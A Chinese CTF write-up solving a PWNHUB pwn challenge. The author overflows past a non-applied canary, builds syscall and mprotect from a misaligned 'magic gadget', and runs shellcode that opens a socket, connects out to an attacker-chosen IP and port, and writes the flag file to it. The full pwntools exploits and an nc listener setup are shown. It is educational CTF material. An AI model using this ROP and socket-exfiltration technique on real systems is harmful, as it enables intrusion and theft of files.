---
title: PWNHUB春季挑战赛
tags:
 - PWN
 - ctf
categories:
 - PWNHUB
---
## 前言

1、rep指令是进行循环，movs qword ptr [rdi],qword ptr[rsi]则可以拷贝，二者结合就是可以大规模拷贝数据到另一个内存空间。而想实现它，仅仅只需要控制rdi和rsi以及rcx寄存器即可。

2、我们往可读可写可执行的内存中写入的任何机器码都是可以被当做指令来执行的，而想执行这些指令，仅仅用ret或者call跳转到这些指令所在地址即可**（ret和call要的是指令所在地址，并非指令）**

3、关闭标准输出，没有回显时，可以利用magic_gadget来去获取一些我们需要的函数。

4、开启沙箱并且三个文件描述符全关时（意味着orw读取的flag也无法看见），可以用socket+connect将flag发送到这个新开的文件上（毕竟close关闭的仅仅是当前终端的0,1,2)

<!--more-->

## 保护策略：


![](/upload/img/2706180-20220426101917635-1568812321.png)

![](/upload/img/2706180-20220426101928743-1588465175.png)


## canary开了，就没法直接溢出？

此时来到的要讲的第一点，checksec是检测出了canary的，但是用gdb调试之后发现，并没有看见canary（如下图），而返回地址是直接被垃圾数据覆盖了。

![](/upload/img/2706180-20220426101943521-1024948707.png)

这是因为出题人编译程序的时候只使用了 fstack-protector  选项，而非使用的 fstack-protector-all  。

简单来说， **fstack-protector-all  选项会对每一个函数都插入一个canary的值，但缺点是会增加很多额外的栈空间**，增加程序体积。**而开启了fstack-protector  选项则是在具有局部数组变量的函数（数组大小超过八字节）才会插入canary，缺点是保护能力有限**。

了解了上述内容后，开启fstack-protector  选项就会出现这种情况，如果是定义的int类型的变量，而后面又使用了输入函数从这个变量开始写入字节且**<font color=red>输入函数写入的字节大于了变量类型的字节数</font>，就会出现检查的时候明明有canary保护，但是依旧可以正常溢出的这种情况**（如下图）。

![](/upload/img/2706180-20220426101952307-600170163.png)

## 程序分析：

程序整体流程非常简单，存在0x1b0的溢出。然后close函数关闭了标准输入、标准输出、标准错误，**就是程序没回显且无法多次输入**。另外开了沙箱保护，无法执行execve来获取shell。那orw?可是标准输出也被关了（之前也做过关闭文件描述符的，不过那几道都没有把文件描述符全部关闭，因此获取shell的时候重定向一下文件描述符就ok了，不过这道题三个描述符全关，没办法重定向文件描述符）

因此这道题采用的对抗策略是一种特殊的orw，使用socket+connect+orw。即创建一个套接字然后connect与一个ip和端口所绑定，再orw，读取flag，将flag打印到新开的socket上，下面仔细讲一下这些都是个什么东西。

## 大致思路：

### socket函数和connect函数咋理解？

具体解释的话可以看一下官方文档，我谈一下自己的理解。(这两个函数布置参数时，需要注意的地方，我做了相关解释，都放在了文末)

**socket函数就是去创建一个套接字**（这个套接字很抽象，不过linux中万物皆文件，我就先试着把它理解为一个文件），如果单独使用的话，它仅仅会创建和声明一下这个'文件'的特征，然后返回一个文件描述符（指向了创建的这个文件）。但此时它还是个空壳子，并没有灵魂。

**而connect函数的作用就是赋予刚刚那个空壳子灵魂**，也就是**将网络的地址与这个文件联系起来**。使用connect函数之后，网络的一个地址及端口就算与socket绑定了,此时发送到socket上的数据就发到了与其绑定的ip的端口上。



也就是说现在的大致思路出来了，但是有很多地方的细节问题还要解决，因为程序里没有socket函数和connect函数，但现在还需要使用，那我们只能去系统调用。

![](/upload/img/2706180-20220426102004222-1183097211.png)


没有syscall...   不过我们可以利用magic gadget造一个出来

## magic gadget

### 什么是magic gadget？

```assembly
add    DWORD PTR [rbp-0x3d], ebx
nop    DWORD PTR [eax+eax*1+0x0]
repz ret
```

magic gadget似乎是一种统称？就是上面这种神奇的小玩意，师傅们都叫它magic gadget，似乎并不单指某个gadgets，因为前一段做[de1ctf_2019_unprintable]([BUUCTF_de1ctf_2019_unprintable - ZikH26 - 博客园 (cnblogs.com)](https://www.cnblogs.com/ZIKH26/articles/16167705.html))的时候，碰见了另一个magic_gadgets。

### magic gadget它有什么用？

这个gadget的核心就在于

```assembly
add    DWORD PTR [rbp-0x3d], ebx
```

可以看出来它可以去修改ebp-0x3d所指向的内容，**只要我们能够控制rbp和ebx，那就可以去修改任意地址的任意值了**（我们可以借此来实现修改got表，或者是往bss段写任意数据）

### magic gadget应该怎么去利用？

首先我们要想办法控制rbp和ebx的值，这一点我们可以通过程序中的csu片段来做到。

### 先说修改got表

既然add增加的是rbp-0x3d所指向的数据，而ebx又是增加的值，我就以这道题获取syscall的方法为例说明一下。

我上面提到了syscall仅仅是距离alarm的真实地址为5个字节的偏移，那岂不是说我**ebx存一个5，然后让rbp-0x3d为alarm的got地址，执行magic gadget就可以修改alarm的got表为syscall的真实地址**。如此我们再执行alarm函数的时候，就相当于执行的是syscall。

> 此时这里就有一个坑，想执行syscall的时候，我应该用alarm的got地址还是plt地址？ 答案放在了文末

### 再说往bss段中任意写入数据

其实说写入数据就应该想到一个疑问，add指令是进行加法，咋就能直接去写入**任意**数据了，如果rbp-0x3d指向的位置原本就有数据，还能任意写？

答案是不能的，这只是一个magic gadget，又不是一个无敌gadget，指令确实只能相加，可注意审题，我说的是**往bss段任意写入数据**。bss段有什么特点？**它属于静态内存分配，程序一开始就会对这个段进行清零**。既然**bss段里面都是0，那就相当于我不管add什么，都是相当于我往里面写了什么**。因此用magic gadget在对bss段进行操作的时候，是可以达到任意地址任意写的（不过值得一提的是，**由于偏移是放在ebp中的，因此在64位程序里面，用magic gadget写的时候，一次只能写入四个字节**）



## 寻找magic gadget

这个神奇的小东西存在于\__do\_global\_dtors\_au这个函数中，它是gcc编译器自身的一个函数，作用是析构函数。但是**在ida查看会发现这段gadget并不存在，但是可以通过将机器码错位得到我们想要的gadget**。

![](/upload/img/2706180-20220426102017372-286472307.png)


现在看一下ida正常的两个指令，以及他们对应的十六进制机器码![](/upload/img/2706180-20220426102025440-653483116.png)
![](/upload/img/2706180-20220426102033744-1476514134.png)

![](/upload/img/2706180-20220426102057610-1265266427.png)

![](/upload/img/2706180-20220426102206921-1073508038.png)




发现将机器码再转成汇编，确实是原来的指令。不过我们现在去拿01 5d c3这段机器码（也就是上面两个指令之间的一部分）去得到我们想要的magic gadget（如下图）
![](/upload/img/2706180-20220426102217546-987677091.png)



**理论上这个gadget在每个64位程序都存在（不过需要机器码错位得到）**。

需要的时候，直接用Ropgadget搜这个机器码就可以了。（参数是opcode)
![](/upload/img/2706180-20220426102225206-1415630040.png)



### 怎么理解这个错位得到的机器码？
![](/upload/img/2706180-20220426102239185-1717796383.png)



观察上图，很容易就会有一个问题，CPU如何知道这个机器指令的长度？

其实啊，每个指令由操作码和操作数两部分组成，CPU设计好的时候，指令集就已经确定了，CPU对每条指令都规定了对应的机器码，**CPU刚开始读取指令的时候，并不知道这个指令的长度，不过它会先读取操作码，读完操作码之后，它就知道这个指令应该是多长了，从而再去读对应字节的操作数**。

这样再理解错位机器码的时候就很容易了，CPU面对的只有二进制01（上面写成十六进制是方便理解），只要你能确保你想要的指令是存在于代码段的，尽管他们在ida里是看不到的。却依然可以去拿这个指令去执行，**因为CPU并不会去检查你这个指令是否是程序中正常的指令，即使你是错位得到的**。



## 一个字节太多的payload

现在也有了syscall，那按理说可以去进行系统调用socket和connect了吧？
![](/upload/img/2706180-20220426102259813-2020062452.png)



也没有rax...，程序里也没有任何与rax有关的指令。

但是libc里啥都有，因此我们的对策是在libc里找到pop rax ; ret指令，然后将其覆写到无用函数的got表里。

继续采用magic gadget。大致思路就是去拿到libc中无用函数的偏移再拿到libc中pop rax;ret的偏移，然后计算二者偏移放入ebx，然后rbp-0x3d写入无用函数的got地址，执行magic gadget即可。去libc中找函数偏移的时候踩了个坑，在文末记录了一下。

接着思路就很简单了，用magic gadget凭空造出来我们需要的东西，然后去用ret2syscall的手法来执行socket+connect+open+read+write函数即可。真的这么简单么？ 我们似乎忘记了，这道题是有溢出限制的。0x1b0个字节的溢出，看起来很多，但是真正实现起来刚才的思路会发现溢出远远不够。

下面是上面思路所对应的exp（不想仔细研究的可以不研究，毕竟这个不是本题正确的exp，只是放一下上面思路的exp（这个如果溢出足够的话，这个exp是可以打通的））

```python
#coding:utf-8
from pwn import *
context(arch='amd64',log_level='debug')
p=process('./a')
e=ELF('./a')
#gdb.attach(p)
libc=ELF('libc.so.6')

alarm_plt_addr=e.plt['alarm']
alarm_got_addr=e.got['alarm']
close_got_addr=e.got['close']
close_plt_addr=e.plt['close']
prctl_got_addr=e.got['prctl']
prctl_plt_addr=e.plt['prctl']
read_got_addr=e.got['read']

main_addr=0x40086A
pop_rdi_addr=0x400903
pop_rsi_r15_addr=0x400901
bss_addr=0x601100
magic_gadget_addr=0x400618
gadget=0x4008fa

#此时在将flag写入bss段
payload=16*'a'
payload+=p64(gadget)
payload+='flag\x00\x00\x00\x00'#这里即使最后ebx只能传送前四字节，但依然要用\x00来补齐
# 不然会导致后面地址与flag会在同一个内存单元
payload+=p64(bss_addr+0x3d)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(magic_gadget_addr)

#此时在将sockaddr结构写入bss段
# 127.0.0.1 1000 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET
#下面两部分，是在凑齐p64(0x0100007fe8030002),因为ebp一次只能传四字节，因此要传两次
#这个回环地址可以改成⾃⼰的服务器的ip端⼝（以此在比赛当做拿到远程的flag）
payload+=p64(gadget)
payload+=p64(0xe8030002)#同上，即使最后ebx只传送四字节，但依然要用p64来放到栈里，用来保持一个完整的内存单元
payload+=p64(bss_addr+8+0x3d)#这里加8是要跳过flag所处的整个内存单元
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(magic_gadget_addr)

payload+=p64(gadget)
payload+=p64(0x0100007f)
payload+=p64(bss_addr+12+0x3d)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(magic_gadget_addr)


#修改alarm的got表为syscall地址
payload+=p64(gadget)
payload+=p64(0x5)
payload+=p64(alarm_got_addr+0x3d)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(magic_gadget_addr)


#prctl libc偏移0x122210
#pop_rax_pop_rdx_pop_rbx的偏移为0x166241
#执行完下面的内容之后，prctl函数的got表装的是pop_rax_pop_rdx_pop_rbx ; ret
payload+=p64(0x4008da)
payload+=p64(0x44031)
payload+=p64(prctl_got_addr+0x3d)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0x400618)

#接下来执行的内容是
#socket(2,1,0)
#connect(0,socket_struct_addr,0x8)
#open(flag_addr,0)
#read(1,bss_addr+400,0x30)
#write(0,bss_addr+400,0x30)


#socket(2,1,0)ipv6,面向连接的套接字,tcp传输协议
payload+=p64(pop_rdi_addr)
payload+=p64(2)
payload+=p64(pop_rsi_r15_addr)
payload+=p64(1)
payload+=p64(0)#r15
payload+=p64(prctl_plt_addr)#pop_rax_pop_rdx_pop_rbx ; ret
payload+=p64(0x29)
payload+=p64(0)
payload+=p64(0)#rbx无用寄存器
payload+=p64(alarm_plt_addr)#syscall

#connect(soc,struct_socket_addr,sizeof(struct_socket)
#调试socket发现，执行之后，然后的rax值是0，因此connect的rdi为0
payload+=p64(pop_rdi_addr)
payload+=p64(0)
payload+=p64(pop_rsi_r15_addr)
payload+=p64(bss_addr+0x8)
payload+=p64(0)#r15无用寄存器
payload+=p64(prctl_plt_addr)
payload+=p64(42)
payload+=p64(16)
payload+=p64(0)#rbx无用寄存器
payload+=p64(alarm_plt_addr)

#open(flag_addr,0)
payload+=p64(pop_rdi_addr)
payload+=p64(bss_addr)
payload+=p64(pop_rsi_r15_addr)
payload+=p64(0)
payload+=p64(0)#15无用寄存器
payload+=p64(prctl_plt_addr)
payload+=p64(2)
payload+=p64(0)#rdx无用寄存器
payload+=p64(0)#rbx无用寄存器
payload+=p64(alarm_plt_addr)

#read(open_return_value,bss+400,0x30)
payload+=p64(pop_rdi_addr)
payload+=p64(1)
payload+=p64(pop_rsi_r15_addr)
payload+=p64(bss_addr+400)
payload+=p64(0)#r15无用寄存器
payload+=p64(prctl_plt_addr)
payload+=p64(0)
payload+=p64(0x30)
payload+=p64(0)#rbx无用寄存器
payload+=p64(alarm_plt_addr)

#write(0,bss_addr+400,0x30)
payload+=p64(pop_rdi_addr)
payload+=p64(0)
payload+=p64(pop_rsi_r15_addr)
payload+=p64(bss_addr+400)
payload+=p64(0)#r15无用寄存器
payload+=p64(prctl_plt_addr)
payload+=p64(1)
payload+=p64(0x30)
payload+=p64(0)#rbx无用寄存器
payload+=p64(alarm_plt_addr)

p.send(payload)
print(hex(len(payload)))
p.interactive()
```
![](/upload/img/2706180-20220426102311543-185742101.png)



发现现在的payload是0x2e0...  因此还要换一下方法，大致思路没问题，但是现在要考虑的是怎么让payload更短，其实观察一下上面的payload就会发现很多字节其实都是被浪费掉了，因为p64()打包就填充了非常多的0（如下图）
![](/upload/img/2706180-20220426102321696-469048676.png)



## 试着使用shellcode？

如果我们可以执行对应汇编指令的机器码，并且我们直接将对应的机器码发过去，那岂不是就把p64打包出现很多00的问题给解决了么。

想执行shellcode其实也非常简单，只需要执行mprotect这个函数把一页内存属性给改成可读可写可执行就ok了。也就是说我们不再去用ret2syscall的手法布置rop链了，先去执行mprotect，然后将我们栈中布置的shellcode拷贝到bss段，最后执行shellcode。

不过随之产生了几个问题

> 1、为什么要把shellcode拷贝到bss段？
>
> 答：由于栈基址随机化，我们无法用mprotect函数准确的改变栈的属性，但是bss段的地址是确定的，因此可以使用mprotect函数修改bss段属性，然后只需要将shellcode迁移到bss段即可。
>
> 2、怎么将shellcode拷贝到bss段？
>
> 利用rep movs qword ptr [rdi],qword ptr[rsi] ; ret指令，**这个指令就是将rsi指向的内容赋给rdi指向的内容**，同时执行完毕后rsi和rdi会自动增加，指向下一个内存单元，不断循环该过程，循环的次数由rcx寄存器的值决定（每次减1，减到0为止）
>
> 3、怎么将执行流劫持到bss段？
>
> hh,这个问题想解决的话，要去调试，最后我解释一下。

## 正文开始——构造正确的exp

四千字了...  现在才来到了如何构建本题正确的exp

第一件事，我们需要造一个mprotect函数。我们采用的方法是用magic_gadget将alarm函数的got表修改为mprotect函数的真实地址。

```python
payload+=p64(csu_gadget1)
payload+=p64(mprotect_offsetalarm_offset)+p64(alarm_got_addr+0x3d)
payload+=32*'a'
payload+=p64(magic_gadget_addr)
```

现在想控制rbx和rbp的话只能执行csu片段，不过这个缺点非常明显，直接填充了32字节的垃圾数据，但是没办法，暂时只能用csu片段来控制rbx和rbp。

第二件事，就是执行mprotect函数，只有改变了bss段的内存属性，我们才可以做更多的事情。

```python
payload+=p64(csu_gadget1)#执行csu片段传参，这没什么好说的
payload+=p64(0)+p64(1)
payload+=p64(alarm_got_addr)
payload+=p64(bss_ye)#这个就是映射到bss的内存页地址
payload+=p64(0x100000)+p64(7)
payload+=p64(csu_gadget2)
```

此时的bss段已经变成了可读可写可执行（如下图）


![](/upload/img/2706180-20220426103623192-486607434.png)



那我们现在要立刻造出来pop_rbx_pop_rbp_ret这个指令，因为我们接下来还要用几次magic_gadget，但是不能每次使用都执行一次csu片段吧，这样的话肯定最后的payload会超长。造这个指令很简单，因为bss段已经可执行（**就是我们往bss段写的内容都可以被当做指令来用**），有什么好说的，直接把需要造的指令对应机器码写到bss段上（上文已经提过利用magic_gadget往bss段写入数据了）

这个网站可以在线汇编指令转机器码   [here]([Online x86 and x64 Intel Instruction Assembler (defuse.ca)](https://defuse.ca/online-x86-assembler.htm#disassembly))

```python
#往bss_addr+0x10写入pop rbx;pop rbp;pop rcx;ret
#5B5D59C3为pop rbx;pop rbp;pop rcx;ret的机器码，由于p64()打包会将数据进行小端序处理，因此我们需要提前手动小端序处理一次，以来确保指令是正常顺序存入bss段的
payload+='a'*8+p64(0xc3595d5b)+p64(bss_addr+0x10+0x3d)
payload+=32*'a'
payload+=p64(magic_gadget_addr)
```

此时我们再执行magic_gadget就可以直接用bss_addr+0x10中存放的pop rbx;pop rbp;pop rcx;ret（至于为什么还要pop rcx，因为这样会更省字节，后面就不用专门造一个pop rcx;ret指令了）

接着我们需要再造两个指令，分别是:

```assembly
rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3 
mov rsi,rsp;ret #4889E6C3
```

第一个很好理解，是负责拷贝的rep，可是为什么要用第二个指令呢？考虑一下我们使用rep的时候怎么去控制这个rsi,我们本来是控制不了，并且我们还需要这个rsi指向当前栈顶的内容（因为rep指令下面就是shellcode了），因此才需要造一个这个gadget出来。

```python
#往bss_addr写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret

payload+=p64(bss_addr+0x10)
#现在bss_addr+0x10就相当于pop rbx;pop rbp;pop rcx;ret这个指令了
payload+=p64(0xc3a548f3)+p64(bss_addr+0x3d)+p64(0)
payload+=p64(magic_gadget_addr)


#往bss段+0x8写入mov rsi,rsp;ret
payload+=p64(bss_addr+0x10)
payload+=p64(0xc3e68948)+p64(bss_addr+0x8+0x3d)+p64(15)
payload+=p64(magic_gadget_addr)
```

至此所有准备工作完成，我们接下来就是执行rep指令并且布置shellcode了

shellcode如下：

```assembly
#socket(2,1,0)
push 2
pop rdi
push 1
pop rsi
psuh 0
pop rdx
push 41
pop rax
syscall

#connect(0,socket_struct_addr,0x8)
push 0
pop rdi
mov rcx,0x13589c5282230002 #如果打本地的话，这里改成0x0100007fe8030002 对应的ip和端口为127.0.0.1 1000
#push没法直接压入0x13589c5282230002，只能通过寄存器中转
push rcx 
mov rsi,rsp
push 0x10
pop rdx
push 42
pop rax
syscall

#open(flag_addr,0)
push 0x67616c66
mov rdi,rsp#本来这里为了更短应该使用push rsp;pop rdi的，但是不知道为啥，这回程序这么写就会直接崩溃，不过好在溢出卡的不死，也不差这几个字节
push 0
pop rsi
push 2
pop rax
syscall

#read(1,0x601500,0x50)
push 1
pop rdi
mov rsi,0x601500
push 0x50
pop rdx
push 0
pop rax
syscall

#write(0,0x601500,0x50)
push 0
pop rdi
mov rsi,0x601500
push 0x50
pop rdx
push 1
pop rax
syscall
```

把上述shellcode全部转成机器码如下：

```assembly
socket="\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05"

connect="\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05"

orw="\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
```

最后的payload执行下rep指令再布置下shellcode

```python
payload+=p64(pop_rdi_addr)+p64(bss_addr+0x50)#把shellcode布置到bss_addr加0x50的地方
payload+=p64(bss_addr+0x8)#把rsp的值给rsi，也就是说rsi值为下面这个bss_addr所对应的栈地址
payload+=p64(bss_addr)#执行rep指令，至此拷贝开始
```

最后再回答一下当时问的怎么将执行流劫持到bss段上。

通过调试发现，拷贝的时候只有rsi和rdi在移动，而rsp始终没有变，因此我只需要在发送shellcode之前放一个bss段地址（这个地址要执行shellcode的首地址），在payload的最后加上一个ret即可完成劫持执行流。


![](/upload/img/2706180-20220426103703621-1232925873.png)



## 完整exp

```python
#coding:utf-8
from pwn import *
context(arch='i386',os='linux',log_level='debug')
p=process('./b')
#p=remote("47.97.127.1",26417)
#gdb.attach(p)
e=ELF('./b')

ret_addr=0x4004e6
magic_gadget_addr=0x400618
pop_rdi_addr=0x400903
pop_rsi_r15_addr=0x400901
rdx_offset=0x1b96
mprotect_offset=0x11b7e0
alarm_offset=0xe44f0
close_offset=0x110870
prctl_offset=0x122210
read_offset=0x110020
csu_gadget1=0x4008FA
csu_gadget2=0x4008E0
pop_rdi_ret=0x400645
term_hook=0x600e48
alarm_got_addr=e.got['alarm']
alarm_plt_addr=e.plt['alarm']
prctl_got_addr=e.got['prctl']
prctl_plt_addr=e.plt['prctl']
close_got_addr=e.got['close']
close_plt_addr=e.plt['close']
read_plt_addr=e.plt['read']
read_got_addr=e.got['read']
pop_rax_offset=0x24ad4
pop_rdx_offset=0x1b96
rep_offset=0x3f84a
bss_addr=0x601100
bss_ye=0x601000
mov_rdi_rsp_offset=0x15c2fe

#socket(2,1,0)
"""
push 2
pop rdi
push 1
pop rsi
psuh 0
pop rdx
push 41
pop rax
syscall
"""
socket="\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05"

#connect(0,socket_struct_addr,0x8)
"""
push 0
pop rdi
mov rcx,0x13589c5282230002
push rcx
mov rsi,rsp
push 0x10
pop rdx
push 42
pop rax
syscall
"""

#remote
#connect="\x6A\x00\x5F\x48\xB9\x02\x00\x23\x82\x52\x9C\x58\x13\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05"

#local
connect="\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05"
#open(flag_addr,0)
#read(1,0x601500,0x50)
#write(0,0x601500,0x50)

"""
push 0x67616c66
mov rdi,rsp
push 0
pop rsi
push 2
pop rax
syscall

push 1
pop rdi
mov rsi,0x601500
push 0x50
pop rdx
push 0
pop rax
syscall

push 0
pop rdi
mov rsi,0x601500
push 0x50
pop rdx
push 1
pop rax
syscall
"""
#mov rsi,0x601500
orw="\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05"


"""
下面三个指令所对应的机器码
rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3
mov rsi,rsp;ret #4889E6C3
pop rbx;pop rbp;pop rcx #5B5D59C3
"""


#将alarm函数的got表换成mprotect的真实地址
payload='a'*16
payload+=p64(csu_gadget1)
payload+=p64(mprotect_offset-alarm_offset)+p64(alarm_got_addr+0x3d)
payload+=32*'a'
payload+=p64(magic_gadget_addr)
payload+=p64(csu_gadget1)

#执行mprotect函数
payload+=p64(0)+p64(1)
payload+=p64(alarm_got_addr)
payload+=p64(bss_ye)
payload+=p64(0x100000)+p64(7)
payload+=p64(csu_gadget2)

#往bss段+0x10写入pop rbx;pop rbp;pop rcx;ret
payload+='a'*8+p64(0xc3595d5b)+p64(bss_addr+0x10+0x3d)
payload+=32*'a'
payload+=p64(magic_gadget_addr)

payload+=p64(bss_addr+0x10)
#往bss段写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret
#payload+=p64(bss_addr+0x10)
payload+=p64(0xc3a548f3)+p64(bss_addr+0x3d)+p64(0)
payload+=p64(magic_gadget_addr)

#往bss段+0x8写入mov rsi,rsp;ret
payload+=p64(bss_addr+0x10)
payload+=p64(0xc3e68948)+p64(bss_addr+0x8+0x3d)+p64(15)
payload+=p64(magic_gadget_addr)

#执行rep指令
payload+=p64(pop_rdi_addr)+p64(bss_addr+0x50)
payload+=p64(bss_addr+0x8)
payload+=p64(bss_addr)
payload+=socket+connect+orw
payload+=p64(ret_addr)
print('shellcode_length---------->',hex(len(socket+connect+orw)))
print('payload_length------------>',hex(len(payload)))
p.sendline(payload)
p.interactive()
```

![](/upload/img/2706180-20220426103751910-1556922758.png)


## 补充

### 关于socket和connect的参数

```c
int socket(int domain, int type, int protocol);
```

第一个参数是地址族，也就是IP地址的类型；第二个参数是数据的传输方式；第三个参数是采用的传输协议

这个没什么好说的，我们最后参数采用的分别是2,1,0 即ipv6，面向连接的套接字，TCP传输协议



```c
int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
```

第一个参数是socket函数返回的文件描述符；第二个参数是sockaddr结构体的地址；第三个参数是sockaddr的结构体大小

第一个参数没什么好说的，第二个就很有讲究了，什么是sockaddr结构体？不知道这个怎么写payload？翻一下glibc源码（这个sockaddr结构体位于socket.h这个文件下）

```c
struct sockaddr
  {
    __SOCKADDR_COMMON (sa_);        /* Common data: address family and length.  */
    char sa_data[14];                /* Address data.  */
  };
```

第一个成员放的是地址族，第二个成员放的是ip地址加端口（这里要把ip地址和端口转换成十六进制以小端序发送（参考如下）

以转换127.0.0.1 1000为例

分别把127 0 0 1 1000转换成16进制7F 00 00 01 03e8，然后反序排列为0100007F03e8（**因为p64打包会使ip地址和端口以小端序排列，而最后使用的时候又要使用正序的ip地址和端口，因此我们先将其转换为反序，再用p64打包，最后存储在sockaddr的结构体中的数据依然是正序的ip和端口**）

第三个结构体就自然而然是16字节了（当时有一个困惑的点就是发送sockaddr结构体的时候，明明只写了8字节，但这个大小（也就是第三个参数）非要填16字节，看完源码答案自然而解）

### 关于上文出现问题的解释：

> 如果修改了某个函数的got表（至于修改成什么不重要），现在想要使用这个被修改的got表（也就是被修改成的内容）。到最后执行ret指令时，（栈顶的内容）应该用plt地址来衔接，还是用got地址来衔接？
>
> **ret指令，也就是pop rip**，也就是把栈顶的内容（这里要尤其注意，我强调的是**栈顶的内容**）直接弹给rip，如果衔接got地址是什么情况？把一个跳板放到ret里？这个跳板什么都做不了**，跳板，顾名思义，只能被别人踩在下面跳到别人想跳的地址，它自身没有什么意义**。
>
> 如果放入plt地址呢？既然是修改了got表，也就是说肯定是进行延迟绑定了，**执行那个函数plt表的第一条指令，jmp ptr【got地址】，此时去跳到了跳板指向的地方（也就是被修改的got表）**，此时才能完成我们想要的要求。



### pwntools中的一个未解之谜

这里是当时踩的一个坑，至今未能找出原因，在此记录一下。

上面提到要找到无用函数在libc中的偏移，我最开始采用的是这个方法

![](/upload/img/2706180-20220426103817080-960601662.png)



但是得到的close函数在libc中的偏移是不正确的，这一点很奇怪。

这里我记录一下排查这个问题的方法。**先查看一下libc基地址，然后用gdb看一下close延迟绑定之后的真实地址，二者相减看是否是打印出来的close函数在libc中的偏移。显然用这个方法测试之后的偏移是不一样的。此时才意识到上图的方法并不能打印出来正确的close偏移。**

**解决方法①：**

gdb动态调试看一下，它的真实地址

![](/upload/img/2706180-20220426103846637-587580728.png)



然后再用gdb看下，libc的基地址


![](/upload/img/2706180-20220426103859734-1715666525.png)


二者相减，拿到close在libc中的偏移

**解决方法②：**

使用命令

```shell
readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep 'mprotect'
```

![](/upload/img/2706180-20220426103934059-170044952.png)


或者

```shell
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep '_close'
```

![](/upload/img/2706180-20220426104003427-537650546.png)



但是用objdump有时候似乎搜的不太对，反正搜libc中函数偏移的时候，尽量使用readelf命令

### 关于打本地时监听端口的一个小坑

当脚本写完之后，运行的时，我又踩到了最后一个坑。

这个脚本现在是将flag的数据读到了socket上然后将其发送到connect连接到的端口上，我们想接收这个数据就必须先监听这个端口，然后等待数据发送过来。

![](/upload/img/2706180-20220426102522302-1487885126.png)

这是我最开始采用的nc -l 1000监听的方式，此时是没有任何数据过来的，最重要的是，connect压根就没有连接到这个端口上(换句话说此时压根都没有监听到这个端口），经过疯狂的调试观察（因为原本是不知道哪的问题，只能从脚本里面一点一点查）依旧没有解决，最后询问学长发现，是监听的参数有问题，下去之后通过查询nc的使用手册发现

![](/upload/img/2706180-20220426102531360-796579110.png)

**参数l开启监听模式，参数p才是指定端口（我的问题就是压根就没指定端口，就直接输入了个1000），参数v是详细打印**（一个v是稍微详细，两个v是显示的更详细，不知道这个详细和更详细是啥意思的话，自己试试就知道了）

这是正常的情况
![](/upload/img/2706180-20220426102540992-803595367.png)
